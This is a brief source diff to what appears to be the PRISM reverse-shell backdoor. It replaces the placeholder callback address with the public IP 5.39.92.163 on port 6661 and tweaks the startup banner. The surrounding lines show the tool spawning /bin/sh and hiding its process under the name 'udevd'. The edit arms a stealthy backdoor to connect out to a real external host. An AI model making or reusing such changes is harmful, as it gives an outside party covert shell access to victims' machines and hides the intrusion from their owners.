@@ -38,8 +38,8 @@
 #include <signal.h>
 
 #ifdef STATIC
-# define REVERSE_HOST     "10.0.0.1"
-# define REVERSE_PORT     19832
+# define REVERSE_HOST     "5.39.92.163"
+# define REVERSE_PORT     6661
 # define RESPAWN_DELAY    15
 #else
 # define ICMP_PACKET_SIZE 1024
@@ -47,7 +47,7 @@
 #endif
 
 #define VERSION          "0.5"
-#define MOTD             "PRISM v"VERSION" started\n\n# "
+#define MOTD             "PRISM v"VERSION" started backup\n\n# "
 #define SHELL            "/bin/sh"
 #define PROCESS_NAME     "udevd"
 
